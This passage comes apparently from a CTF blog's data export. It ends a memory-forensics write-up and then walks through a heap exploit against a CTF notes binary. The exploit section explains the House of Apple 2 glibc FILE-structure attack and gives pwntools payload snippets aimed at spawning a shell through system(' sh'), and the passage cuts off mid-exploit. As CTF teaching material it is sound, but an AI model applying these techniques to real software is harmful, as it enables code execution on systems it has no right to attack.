vads/scvhost.exe.11ff67b30.0x000007fffffd9000-0x000007fffffdafff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fffffd7000 0x000007fffffd8fff vads/scvhost.exe.11ff67b30.0x000007fffffd7000-0x000007fffffd8fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fffffd5000 0x000007fffffd6fff vads/scvhost.exe.11ff67b30.0x000007fffffd5000-0x000007fffffd6fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fffffdd000 0x000007fffffdefff vads/scvhost.exe.11ff67b30.0x000007fffffdd000-0x000007fffffdefff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fffffdb000 0x000007fffffdcfff vads/scvhost.exe.11ff67b30.0x000007fffffdb000-0x000007fffffdcfff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fffffdf000 0x000007fffffdffff vads/scvhost.exe.11ff67b30.0x000007fffffdf000-0x000007fffffdffff.dmp\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Since we now the flag format -biosCTF{} we can try to encrypt it with the arlogrithm used by AZRAEL keyword earlier and check if that’s in the vads/heap data .\u003C/p>\n\u003Cp>Encryption algorithm: Double pass of (add digit → XOR → add digit → XOR)\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-18.png\" alt=\"image\">\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>[muffin@muffinn bi0sctfchall1]$ python3 solve.py \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>plaintext[0] = 'b' -> '`'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>plaintext[1] = 'i' -> 'q'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>plaintext[2] = '0' -> '2'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>plaintext[3] = 's' -> 's'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>plaintext[4] = 'C' -> 'W'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>plaintext[5] = 'T' -> 'R'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>plaintext[6] = 'F' -> 'N'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>plaintext[7] = '{' -> ''\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Result: `q2sWRN`\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-19.png\" alt=\"image\">\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>`q2sWRN\\u009d-\\x04ne\\x02~5a:v\"L}7\\tuc4tVaT@7Xo#wg2w5w0w!q4Lfi\\x04rLz5{3\\x08D1Vaxj2Jc\\x7f0EaK\\x0etF5faD15 \u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Now just reversing the ecp is the flag :)\u003C/p>",{"headings":207,"localImagePaths":210,"remoteImagePaths":211,"frontmatter":212,"imagePaths":213},[208,209],{"depth":24,"slug":115,"text":116},{"depth":27,"slug":118,"text":119},[],[],{"title":199,"date":194},[],"an-apple-a-day",{"id":214,"data":216,"body":219,"filePath":220,"digest":221,"rendered":222},{"title":217,"date":218},"An Apple a Day Keeps ASLR Away",["Date","2025-01-04T00:00:00.000Z"],"*[Abusing glibc Wide-Mode I/O and FILE Structure Corruption for Reliable Code Execution]*\r\n\r\n---\r\n\r\nWe are provided with the following `checksec` output for the binary `notes_patched`:\r\n\r\n```bash\r\nmuffin@gentoo checksec -f notes_patched\r\nELF64: | Canary: true  CFI: false SafeStack: false Fortify: false Fortified:  0 NX: true  PIE: Full Relro: Full    RPATH: None RUNPATH: . | File: notes_patched\r\n```\r\n\r\n\r\n\r\n### Enabled Protections\r\n\r\n* **Stack Canary: Enabled**\r\n  Stack canaries are present, making straightforward stack-based buffer overflows harder to exploit without a leak.\r\n\r\n* **NX (Non-Executable Memory): Enabled**\r\n  The stack and heap are non-executable, preventing direct shellcode execution in writable memory regions.\r\n\r\n* **PIE (Position Independent Executable): Enabled (Full)**\r\n  The binary is fully position-independent, meaning ASLR randomizes its base address at runtime.\r\n\r\n* **RELRO: Enabled (Full)**\r\n  The Global Offset Table (GOT) is marked read-only after relocation, preventing GOT overwrite attacks.\r\n\r\n\r\n\r\n### Disabled Protections\r\n\r\n* **CFI (Control Flow Integrity): Disabled**\r\n  No enforcement of valid control-flow transfers, allowing indirect jumps or returns to be abused if control is gained.\r\n\r\n* **SafeStack: Disabled**\r\n  No separation between safe and unsafe stack objects, increasing the impact of memory corruption bugs.\r\n\r\n* **FORTIFY_SOURCE: Disabled**\r\n  No fortified libc wrappers are in use (and no functions are fortified), reducing runtime bounds checking.\r\n\r\nRUNPATH: . - The binary looks for shared libraries in the current directory first (potential security risk)\r\n\r\nfile \r\n![Binary File Info](/images/posts/an-apple-a-day/apple-1.png)\r\n strings so this is a notes app , \r\n\r\n![Strings Output](/images/posts/an-apple-a-day/apple-2.png)\r\n\r\nThe decompilation for the binary was more helpful as i got the whole understanding of the program ; \r\n```c\r\n//\r\n// This file was generated by the Retargetable Decompiler\r\n// Website: https://retdec.com\r\n//\r\n\r\n#include \u003Cstdint.h>\r\n#include \u003Cstdio.h>\r\n#include \u003Cstdlib.h>\r\n#include \u003Cstring.h>\r\n\r\n// ------------------------ Structures ------------------------\r\n\r\nstruct _IO_FILE {\r\n    int32_t e0;\r\n};\r\n\r\n// ------------------- Function Prototypes --------------------\r\n\r\nint64_t _fini(void);\r\nint64_t _init(void);\r\nint64_t _start(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);\r\nint64_t create_note(void);\r\nint64_t delete_note(void);\r\nvoid function_1030(int64_t * ptr);\r\nint32_t function_1040(char * s);\r\nvoid function_1050(void);\r\nint32_t function_1060(char * format, ...);\r\nint32_t function_1070(char * s, char * reject);\r\nchar * function_1080(char * s, int32_t n, struct _IO_FILE * stream);\r\nint32_t function_1090(void);\r\nint64_t * function_10a0(int32_t size);\r\nint32_t function_10b0(struct _IO_FILE * stream, char * buf, int32_t modes, int32_t n);\r\nint32_t function_10c0(char * format, ...);\r\nint32_t function_10d0(int64_t * ptr, int32_t size, int32_t n, struct _IO_FILE * s);\r\nint64_t function_1110(void);\r\nint64_t function_1140(void);\r\nint64_t function_1180(void);\r\nint64_t function_11d0(void);\r\nint64_t menu(void);\r\nint64_t read_note(void);\r\nint64_t setup(void);\r\nint64_t write_note(void);\r\n\r\n// --------------------- Global Variables ---------------------\r\n\r\nint64_t g1 = -0x9b2000009cc; // 0x2208\r\nstruct _IO_FILE * g2 = NULL; // 0x4020\r\nstruct _IO_FILE * g3 = NULL; // 0x4030\r\nchar g4 = 0; // 0x4048\r\nchar * g5; // 0x4080\r\nint64_t g6 = 0; // 0x4088\r\nint32_t g7 = 0; // 0x4120\r\nint32_t g8 = 0; // 0x4121\r\nint32_t g9;\r\n\r\n// ------- Dynamically Linked Functions Without Header --------\r\n\r\nvoid __cxa_finalize(int64_t * a1);\r\nvoid __gmon_start__(void);\r\nint32_t __libc_start_main(int64_t a1, int32_t a2, char ** a3, void (*a4)(), void (*a5)(), void (*a6)());\r\nvoid __stack_chk_fail(void);\r\n\r\n// ------------------------ Functions -------------------------\r\n\r\n// Address range: 0x1000 - 0x101b\r\nint64_t _init(void) {\r\n    int64_t result = 0; // 0x1012\r\n    if (*(int64_t *)0x3fe8 != 0) {\r\n        // 0x1014\r\n        __gmon_start__();\r\n        result = &g9;\r\n    }\r\n    // 0x1016\r\n    return result;\r\n}\r\n\r\n// Address range: 0x1030 - 0x1036\r\nvoid function_1030(int64_t * ptr) {\r\n    // 0x1030\r\n    free(ptr);\r\n}\r\n\r\n// Address range: 0x1040 - 0x1046\r\nint32_t function_1040(char * s) {\r\n    // 0x1040\r\n    return puts(s);\r\n}\r\n\r\n// Address range: 0x1050 - 0x1056\r\nvoid function_1050(void) {\r\n    // 0x1050\r\n    __stack_chk_fail();\r\n}\r\n\r\n// Address range: 0x1060 - 0x1066\r\nint32_t function_1060(char * format, ...) {\r\n    // 0x1060\r\n    return printf(format);\r\n}\r\n\r\n// Address range: 0x1070 - 0x1076\r\nint32_t function_1070(char * s, char * reject) {\r\n    // 0x1070\r\n    return strcspn(s, reject);\r\n}\r\n\r\n// Address range: 0x1080 - 0x1086\r\nchar * function_1080(char * s, int32_t n, struct _IO_FILE * stream) {\r\n    // 0x1080\r\n    return fgets(s, n, stream);\r\n}\r\n\r\n// Address range: 0x1090 - 0x1096\r\nint32_t function_1090(void) {\r\n    // 0x1090\r\n    return getchar();\r\n}\r\n\r\n// Address range: 0x10a0 - 0x10a6\r\nint64_t * function_10a0(int32_t size) {\r\n    // 0x10a0\r\n    return malloc(size);\r\n}\r\n\r\n// Address range: 0x10b0 - 0x10b6\r\nint32_t function_10b0(struct _IO_FILE * stream, char * buf, int32_t modes, int32_t n) {\r\n    // 0x10b0\r\n    return setvbuf(stream, buf, modes, n);\r\n}\r\n\r\n// Address range: 0x10c0 - 0x10c6\r\nint32_t function_10c0(char * format, ...) {\r\n    // 0x10c0\r\n    return scanf(format);\r\n}\r\n\r\n// Address range: 0x10d0 - 0x10d6\r\nint32_t function_10d0(int64_t * ptr, int32_t size, int32_t n, struct _IO_FILE * s) {\r\n    // 0x10d0\r\n    return fwrite(ptr, size, n, s);\r\n}\r\n\r\n// Address range: 0x10e0 - 0x1106\r\nint64_t _start(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {\r\n    // 0x10e0\r\n    int64_t v1; // 0x10e0\r\n    __libc_start_main(0x17b4, (int32_t)a6, (char **)&v1, NULL, NULL, (void (*)())a3);\r\n    __asm_hlt();\r\n    // UNREACHABLE\r\n}\r\n\r\n// Address range: 0x1110 - 0x1139\r\nint64_t function_1110(void) {\r\n    // 0x1110\r\n    return 0x4018;\r\n}\r\n\r\n// Address range: 0x1140 - 0x1179\r\nint64_t function_1140(void) {\r\n    // 0x1140\r\n    return 0;\r\n}\r\n\r\n// Address range: 0x1180 - 0x11c1\r\nint64_t function_1180(void) {\r\n    // 0x1180\r\n    if (g4 != 0) {\r\n        // 0x11c0\r\n        int64_t result; // 0x1180\r\n        return result;\r\n    }\r\n    // 0x118d\r\n    if (*(int64_t *)0x3ff8 != 0) {\r\n        // 0x119b\r\n        __cxa_finalize((int64_t *)*(int64_t *)0x4008);\r\n    }\r\n    int64_t result2 = function_1110(); // 0x11a8\r\n    g4 = 1;\r\n    return result2;\r\n}\r\n\r\n// Address range: 0x11d0 - 0x11d9\r\nint64_t function_11d0(void) {\r\n    // 0x11d0\r\n    return function_1140();\r\n}\r\n\r\n// Address range: 0x11d9 - 0x121c\r\nint64_t setup(void) {\r\n    // 0x11d9\r\n    setvbuf(g3, NULL, 2, 0);\r\n    return setvbuf(g2, NULL, 2, 0);\r\n}\r\n\r\n// Address range: 0x121c - 0x1241\r\nint64_t menu(void) {\r\n    // 0x121c\r\n    puts(\"\\n[ MENU ]\\n\");\r\n    return puts(\"[1] CREATE NOTE\\n[2] DELETE NOTE\\n[3] READ NOTE\\n[4] WRITE NOTE\\n[5] EXIT\\n\");\r\n}\r\n\r\n// Address range: 0x1241 - 0x1428\r\nint64_t create_note(void) {\r\n    int64_t v1 = __readfsqword(40); // 0x124a\r\n    int32_t v2 = 0; // 0x128b\r\n    int64_t v3 = 16 * (int64_t)v2;\r\n    int32_t * v4 = (int32_t *)(v3 + (int64_t)&g6);\r\n    int64_t v5; // 0x1241\r\n    while (*v4 != 0) {\r\n        // 0x128b\r\n        v2++;\r\n        if (v2 >= 10) {\r\n            // 0x129b\r\n            puts(\"\\n!! NO SPACE FOR NEW NOTE !!\");\r\n            v5 = 0xffffffff;\r\n            goto lab_0x140e;\r\n        }\r\n        v3 = 16 * (int64_t)v2;\r\n        v4 = (int32_t *)(v3 + (int64_t)&g6);\r\n    }\r\n    // 0x12b4\r\n    printf(\"ENTER SIZE: \");\r\n    int64_t size; // bp-44, 0x1241\r\n    scanf(\"%d\", &size);\r\n    int64_t * mem = malloc((int32_t)size); // 0x12eb\r\n    int64_t * str = (int64_t *)(v3 + (int64_t)&g5); // 0x1306\r\n    *str = (int64_t)mem;\r\n    if (mem != NULL) {\r\n        // 0x133f\r\n        printf(\"\\nENTER NOTE (MAX %d CHARS): \", size + 0xffffffff & 0xffffffff);\r\n        getchar();\r\n        fgets((char *)*str, (int32_t)size, g3);\r\n        int64_t str2 = *str; // 0x139e\r\n        *(char *)(str2 + (int64_t)strcspn((char *)str2, \"\\n\")) = 0;\r\n        printf(\"%s\", \"\u003C BACK\");\r\n        *v4 = 1;\r\n        v5 = 0;\r\n    } else {\r\n        // 0x1326\r\n        puts(\"\\n!! MEMORY ALLOCATION FAILED !!\");\r\n        v5 = 0xffffffff;\r\n    }\r\n    goto lab_0x140e;\r\n  lab_0x140e:;\r\n    int64_t result = v5; // 0x141b\r\n    if (v1 != __readfsqword(40)) {\r\n        // 0x141d\r\n        __stack_chk_fail();\r\n        result = &g9;\r\n    }\r\n    // 0x1422\r\n    return result;\r\n}\r\n\r\n// Address range: 0x1428 - 0x1546\r\nint64_t delete_note(void) {\r\n    int64_t v1 = __readfsqword(40); // 0x1430\r\n    int32_t v2 = 0; // bp-20, 0x143f\r\n    printf(\"\\nENTER INDEX: \");\r\n    scanf(\"%1d\", &v2);\r\n    getchar();\r\n    int64_t v3; // 0x1428\r\n    if (v2 > 9) {\r\n        // 0x14a3\r\n        puts(\"\\n!! INVALID NOTE INDEX !!\");\r\n        v3 = 0xffffffff;\r\n        goto lab_0x1530;\r\n    } else {\r\n        int64_t v4 = 16 * (int64_t)v2; // 0x148e\r\n        if (*(int32_t *)(v4 + (int64_t)&g6) != 0) {\r\n            // 0x14b9\r\n            free((int64_t *)*(int64_t *)(v4 + (int64_t)&g5));\r\n            int64_t v5 = 16 * (int64_t)v2; // 0x14dd\r\n            *(int64_t *)(v5 + (int64_t)&g5) = 0;\r\n            *(int32_t *)(v5 + (int64_t)&g6) = 0;\r\n            printf(\"%s\", \"\u003C BACK\");\r\n            v3 = 0;\r\n            goto lab_0x1530;\r\n        } else {\r\n            // 0x14a3\r\n            puts(\"\\n!! INVALID NOTE INDEX !!\");\r\n            v3 = 0xffffffff;\r\n            goto lab_0x1530;\r\n        }\r\n    }\r\n  lab_0x1530:;\r\n    int64_t result = v3; // 0x153d\r\n    if (v1 != __readfsqword(40)) {\r\n        // 0x153f\r\n        __stack_chk_fail();\r\n        result = &g9;\r\n    }\r\n    // 0x1544\r\n    return result;\r\n}\r\n\r\n// Address range: 0x1546 - 0x168e\r\nint64_t write_note(void) {\r\n    int64_t v1 = __readfsqword(40); // 0x154e\r\n    int32_t v2 = 0; // bp-28, 0x155d\r\n    int64_t v3 = 0; // bp-24, 0x1564\r\n    printf(\"\\nENTER NOTE INDEX: \");\r\n    scanf(\"%3d\", &v2);\r\n    int64_t v4; // 0x1546\r\n    if (v2 > 9) {\r\n        // 0x15c4\r\n        puts(\"\\n!! INVALID NOTE INDEX !!\");\r\n        v4 = 0xffffffff;\r\n        goto lab_0x1678;\r\n    } else {\r\n        int32_t v5 = *(int32_t *)(16 * (int64_t)v2 + (int64_t)&g6); // 0x15bd\r\n        if (v5 != 0) {\r\n            // 0x15dd\r\n            printf(\"ENTER WRITE INDEX: \");\r\n            scanf(\"%ld\", &v3);\r\n            printf(\"ENTER DATA: \");\r\n            int64_t v6 = *(int64_t *)(16 * (int64_t)v2 + (int64_t)&g5); // 0x1633\r\n            scanf(\"%s\", (char **)(v3 + v6));\r\n            printf(\"%s\", \"\u003C BACK\");\r\n            v4 = 0;\r\n            goto lab_0x1678;\r\n        } else {\r\n            // 0x15c4\r\n            puts(\"\\n!! INVALID NOTE INDEX !!\");\r\n            v4 = 0xffffffff;\r\n            goto lab_0x1678;\r\n        }\r\n    }\r\n  lab_0x1678:;\r\n    int64_t result = v4; // 0x1685\r\n    if (v1 != __readfsqword(40)) {\r\n        // 0x1687\r\n        __stack_chk_fail();\r\n        result = &g9;\r\n    }\r\n    // 0x168c\r\n    return result;\r\n}\r\n\r\n// Address range: 0x168e - 0x17b4\r\nint64_t read_note(void) {\r\n    int64_t v1 = __readfsqword(40); // 0x1696\r\n    int32_t v2 = 0; // bp-20, 0x16a5\r\n    int64_t v3; // 0x168e\r\n    if (g7 > 1) {\r\n        // 0x176c\r\n        puts(\"\\n?? GET SPOTIFY PREMIUM ??\");\r\n        printf(\"%s\", \"\u003C BACK\");\r\n        v3 = 0;\r\n    } else {\r\n        // 0x16bb\r\n        printf(\"\\nENTER INDEX: \");\r\n        scanf(\"%3d\", &v2);\r\n        getchar();\r\n        if (v2 \u003C 11) {\r\n            // 0x1710\r\n            printf(\"NOTE: %s\\n\", (char *)(16 * (int64_t)v2 + (int64_t)&g5));\r\n            printf(\"%s\", \"\u003C BACK\");\r\n            g7 = &g8;\r\n            v3 = 0;\r\n        } else {\r\n            // 0x16f7\r\n            puts(\"\\n!! INVALID NOTE INDEX !!\");\r\n            v3 = 0xffffffff;\r\n        }\r\n    }\r\n    int64_t result = v3; // 0x17ab\r\n    if (v1 != __readfsqword(40)) {\r\n        // 0x17ad\r\n        __stack_chk_fail();\r\n        result = &g9;\r\n    }\r\n    // 0x17b2\r\n    return result;\r\n}\r\n\r\n// Address range: 0x17b4 - 0x198b\r\nint main(int argc, char ** argv) {\r\n    // 0x17b4\r\n    __readfsqword(40);\r\n    setup();\r\n    menu();\r\n    printf(\">> \");\r\n    int64_t v1; // bp-20, 0x17b4\r\n    scanf(\"%1d\", &v1);\r\n    uint32_t v2; // 0x182b\r\n    if ((int32_t)v1 \u003C 6) {\r\n        // 0x181a\r\n        v2 = *(int32_t *)((4 * v1 & 0x3fffffffc) + (int64_t)&g1);\r\n        return (int64_t)v2 + (int64_t)&g1;\r\n    }\r\n    puts(\"[ INVALID CHOICE ]\");\r\n    menu();\r\n    printf(\">> \");\r\n    scanf(\"%1d\", &v1);\r\n    while ((int32_t)v1 >= 6) {\r\n        // 0x1958\r\n        puts(\"[ INVALID CHOICE ]\");\r\n        menu();\r\n        printf(\">> \");\r\n        scanf(\"%1d\", &v1);\r\n    }\r\n    // 0x181a\r\n    v2 = *(int32_t *)((4 * v1 & 0x3fffffffc) + (int64_t)&g1);\r\n    return (int64_t)v2 + (int64_t)&g1;\r\n}\r\n\r\n// Address range: 0x198c - 0x1999\r\nint64_t _fini(void) {\r\n    // 0x198c\r\n    int64_t result; // 0x198c\r\n    return result;\r\n}\r\n\r\n// --------------------- Meta-Information ---------------------\r\n\r\n// Detected compiler/packer: gcc (14.2.1)\r\n// Detected functions: 25\r\n\r\n```\r\n\r\nWhile researching heap exploitation techniques and going through various \"House of ____\" exploits, I found that [**House of Apple 2**](https://bbs.kanxue.com/thread-273832.htm) matched perfectly with what this challenge required.\r\n\r\nThe House of Apple technique is primarily concerned with `_IO_FILE->_wide_data` member attacks. It allows us to rewrite memory after hijacking this member or control the program execution flow through FILE structure corruption.\r\n\r\n\r\n## What is a Vtable? \r\n\r\n\r\nA basic vtable is nothing more than an ordinary struct containing function pointers, which can be shared between object instances. \r\n\r\nIll try to write a demo program to understand hoa-2 better and what does it solve and what it does  .\r\n\r\n\r\n\r\n![Decompiled Code](/images/posts/an-apple-a-day/apple-3.png)\r\n\r\n\r\n### glibc Internals\r\n\r\nNext we will need a heap controlled area for exploiting. Before that, some glibc internals.\r\n\r\nglibc uses a big internal structure called `struct _IO_FILE`. This is what backs FILE * objects like stdout, stderr, file streams, etc.\r\n\r\nFor wide-character support (wprintf, fputwc, Unicode stuff), glibc adds extra indirection. _wide_data stores wide-character state and buffers. _wide_vtable is the function pointer table for wide I/O operations. These are separate pointers inside the FILE structure.\r\n\r\n## What is _wide_data?\r\n\r\n_wide_data is a pointer inside _IO_FILE:\r\n\r\n```c\r\nstruct _IO_FILE {\r\n    ...\r\n    struct _IO_wide_data *_wide_data;\r\n    ...\r\n};\r\n```\r\n\r\nWhat it contains conceptually: _IO_wide_data holds wide-character buffers, state for multibyte to wide-char conversion, and pointers used during wide I/O operations.\r\n\r\nSimplified idea:\r\n\r\n```c\r\nstruct _IO_wide_data {\r\n    wchar_t *_IO_read_ptr;\r\n    wchar_t *_IO_read_end;\r\n    wchar_t *_IO_write_ptr;\r\n    wchar_t *_IO_write_end;\r\n    ...\r\n};\r\n```\r\n\r\nThe thing is, if you control _wide_data, glibc will trust pointers inside it. Those pointers get dereferenced during I/O operations. Fake _wide_data lets you redirect reads/writes or prepare for a vtable call.\r\n\r\n\r\n\r\n# glibc vtable exploitation\r\n\r\nWhen glibc performs an I/O operation, it does something like:\r\n\r\n```c\r\nfp->_wide_data->_wide_vtable->overflow(fp, ch);\r\n```\r\n\r\nIf _wide_vtable is fake and heap-controlled, glibc jumps to an attacker-controlled address. This is a clean RIP control primitive.\r\n\r\nInternally, libc has three global FILE objects: stdin, stdout, stderr. Each of these is a fully-initialized _IO_FILE structure with valid locks, valid mode flags, valid wide I/O state, and most importantly our trusted vtables.\r\n\r\n![Wide Data Structure](/images/posts/an-apple-a-day/apple-4.png)\r\n\r\n## What _mode does\r\n\r\nInside _IO_FILE:\r\n\r\n```c\r\nint _mode;\r\n```\r\n\r\nglibc uses _mode to decide byte I/O vs wide-char I/O.\r\n\r\nRule (from glibc):\r\n\r\n```c\r\nif (fp->_mode > 0)\r\n    use wide I/O\r\nelse\r\n    use byte I/O\r\n```\r\n\r\nSo when you do:\r\n\r\n```c\r\nstderr_fp->_mode = 1;\r\n```\r\n\r\nThat guarantees _wide_data will be accessed, _wide_vtable will be dereferenced, and normal byte vtable is bypassed.\r\n\r\n![Mode Field](/images/posts/an-apple-a-day/apple-5.png)\r\n\r\nAfter compiling with these flags i got an error ; we needed to do bc the FILE vtable itself is wrong, so glibc never reaches _IO_WOVERFLOW\r\n\r\nApple 2 still needs a legitimate FILE vtable to route execution into the wide path\r\n\r\nWhile looking through more on house of apple i found this image , which was on the idea of exploit this chalelnge closely resembleded \r\n\r\n![House of Apple 2 Diagram](/images/posts/an-apple-a-day/apple-6.png)\r\n\r\nIn older glibc versions (\u003C 2.24), you could directly overwrite FILE structure vtables. But glibc added **vtable validation** that checks if vtable pointers are within valid memory ranges.\r\n\r\nHouse of Apple 2 bypasses these protections by relying on a design gap in glibc’s FILE validation logic. Instead of forging a fake vtable, it reuses a legitimate and fully validated vtable (`_IO_wfile_jumps`), which passes all internal consistency checks. The exploit then redirects the **wide-character vtable pointer**, which glibc does not subject to the same validation as the primary vtable. When a wide-character I/O path is triggered, glibc dispatches function calls through this unvalidated wide vtable, allowing the attacker to gain control of execution without tripping the standard vtable integrity checks.\r\n\r\nWhen a program calls something like `fwrite()`, glibc eventually looks up a function pointer from the FILE structure’s vtable and calls it. This means the program trusts whatever function address is stored in that table. If an attacker can control that pointer, they get to choose what code runs. That’s the core idea about apple \r\n\r\nglibc also keeps a global linked list of every open FILE stream called `_IO_list_all`. When the program exits, glibc walks this list to flush and close all files. It starts at `_IO_list_all`, follows each `_chain` pointer, and calls flush-related functions on every FILE object it finds. The attack abuses this cleanup step by corrupting the list so that it points to a fake or attacker-controlled FILE structure. When glibc later flushes all streams, it unknowingly calls functions through the attacker-controlled vtable, giving code execution.\r\n\r\nThis is a simple notes application with the following functions:\r\n\r\n```\r\n1. Create note - Allocates heap memory for a note\r\n2. Delete note - Frees a note\r\n3. Read note   - Displays note content\r\n4. Write note  - Writes data to a note at an offset\r\n5. Exit        - Exits the program\r\n```\r\n\r\nThe vulnerability is in the **write_note** function:\r\n\r\n```c\r\nvoid write_note(int idx, size_t offset, char *data) {\r\n    // BUG: offset is NOT validated!\r\n    scanf(\"%s\", notes[idx] + offset);\r\n}\r\n```\r\n\r\n**What this means:**\r\n- `notes[idx]` is a pointer to our note on the heap\r\n- We can specify ANY `offset` (positive or negative!)\r\n- `notes[idx] + offset` lets us write ANYWHERE relative to our note\r\n\r\n**Example:**\r\n```c\r\n// If notes[0] is at address 0x555555559000\r\n// and we use offset = -0x1000\r\n// We write to: 0x555555559000 - 0x1000 = 0x555555558000\r\n\r\n// Or if offset = 0x10000, we write to:\r\n// 0x555555559000 + 0x10000 = 0x555555569000\r\n```\r\n\r\nThis is  an **arbitrary relative write** - we can write anywhere in \r\nmemory relative to our heap \r\n\r\n\r\n\r\nSo First, we need to **leak a libc address**. ASLR randomizes where libc lives in memory, so until we know its base address, we can’t reliably call functions like `system`. Once we leak one libc pointer, we can calculate where everything else in libc is.\r\n\r\nNext, we **leak a heap address**. This tells us where our controlled data lives in memory. We need this because we’re going to place a fake object on the heap and later make the program treat it as something real.\r\n\r\nThen we **build a fake FILE structure on the heap**. A FILE structure is just a big struct full of pointers and flags. glibc trusts it. If we carefully fill it with the right values, glibc won’t realize it’s fake.\r\n\r\nAfter that, we **patch critical FILE pointers** like `_lock`, `_wide_data`, and the wide vtable pointer. These fields are needed so glibc doesn’t crash and so execution eventually flows into a function pointer we control.\r\n\r\nNext, we **overwrite `_IO_list_all`** so that instead of pointing to real FILE streams, it points to our fake FILE structure on the heap. Now glibc thinks our fake object is a real file that needs to be flushed.\r\n\r\nFinally, we **trigger `exit()`**. When the program exits, glibc automatically walks `_IO_list_all` and flushes every FILE it sees. When it reaches our fake FILE, it follows our controlled pointers and ends up calling `system(\"/bin/sh\")`.\r\n\r\n\r\nWhen we call exit ; this is somewhat of a representation of whats happening \r\n\r\n\r\n\r\n![Exit Flow](/images/posts/an-apple-a-day/apple-7.png)\r\n\r\n\r\n\r\nglibc tries to defend against FILE-structure attacks by validating the **main vtable** pointer before using it. That means if you point the main vtable to something fake or attacker-made, glibc will usually detect it and abort. House of Apple 2 avoids this by **not forging a vtable at all**. Instead, it uses a real, legitimate vtable that already exists inside libc, such as `_IO_wfile_jumps`, which passes all validation checks cleanly.\r\n\r\nThe trick is that FILE structures used for wide-character I/O contain a **second vtable**, called the `_wide_vtable`. Unlike the main vtable, this wide vtable is **not validated** by glibc. Once execution enters a wide-character code path, glibc blindly trusts the function pointers inside `_wide_vtable`. By overwriting this pointer, the attacker gains control over which function gets called next.\r\n\r\n First leak a libc address because modern systems use ASLR, which means libc is loaded at a random address every time the program runs. If we do not know where libc is in memory, we cannot reliably call important functions like system. To defeat ASLR, we need to leak one real libc address and use it to calculate the rest.\r\n\r\nThe program lets us read memory using a negative index, which means we can read data before the notes array. In memory, the Global Offset Table (GOT) is located nearby, and it stores the real runtime addresses of libc functions such as free. When we call read_note(-16), we accidentally read the GOT entry for free, leaking its address.\r\n\r\nOnce we have the leaked address of free, we subtract its known offset inside libc. This gives us the base address of libc in memory. From that single value, we can calculate the addresses of all other libc functions, including system, which we will need later in the exploit\r\n\r\n![Memory Leak](/images/posts/an-apple-a-day/apple-8.png)\r\n\r\nWe need to create a fake `_IO_FILE_plus` structure on the heap with three \r\nparts:\r\n\r\n## Part A: Fake `_IO_FILE` structure\r\n\r\n```python\r\nfake_file = flat({\r\n    0x00: b\"  sh\\x00\\x00\\x00\\x00\",    # _flags\r\n    0x88: 0,                         # _lock\r\n    0xa0: 0,                         # _wide_data\r\n    0xc0: 1,                         # _mode\r\n    0xd8: libc.sym['_IO_wfile_jumps']\r\n}, length=224)\r\n```\r\n\r\nThis creates a **fake FILE object** exactly the size glibc expects.\r\n\r\n* **`_flags = \"  sh\"`**\r\n  This field normally stores flags, but later glibc passes it as an argument to a function pointer. Since we hijack that function to be `system`, this becomes:\r\n\r\n  ```\r\n  system(\"  sh\")\r\n  ```\r\n\r\n  which spawns a shell. The spaces help avoid validation checks.\r\n\r\n* **`_lock`**\r\n  glibc expects this to point to writable memory. If it’s invalid, the program crashes. We set it to zero for now and patch it later to point into the heap.\r\n\r\n* **`_wide_data`**\r\n  This tells glibc where the wide-character data lives. We will make this point to another fake structure we control.\r\n\r\n* **`_mode = 1`**\r\n  This forces glibc to use **wide-character functions**, which is crucial because those functions use the unvalidated wide vtable.\r\n\r\n* **`vtable = _IO_wfile_jumps`**\r\n  This is a **real vtable inside libc**. Using a legitimate vtable avoids glibc’s vtable integrity checks.\r\n\r\nAt this point, glibc thinks this is a completely valid FILE object.\r\n\r\n---\r\n\r\n## Part B: Fake `_IO_wide_data`\r\n\r\n```python\r\nwide_data = flat({\r\n    0x18: 0,   # _IO_write_base\r\n    0x20: 1,   # _IO_write_ptr\r\n    0xe0: 0    # _wide_vtable\r\n}, length=0x100)\r\n```\r\n\r\nThis structure controls **when glibc decides to flush a file**.\r\n\r\n* **`_IO_write_ptr > _IO_write_base`**\r\n  Since `1 > 0`, glibc believes there is pending data that needs to be flushed.\r\n\r\n* When glibc flushes, it calls a function from the **wide vtable**, which we control next.\r\n\r\n* **`_wide_vtable`**\r\n  This will be patched to point to our fake wide vtable.\r\n\r\nThis is how we force glibc to actually make the function call.\r\n\r\n---\r\n\r\n## Part C: Fake wide vtable\r\n\r\n```python\r\nwide_vtable = flat({\r\n    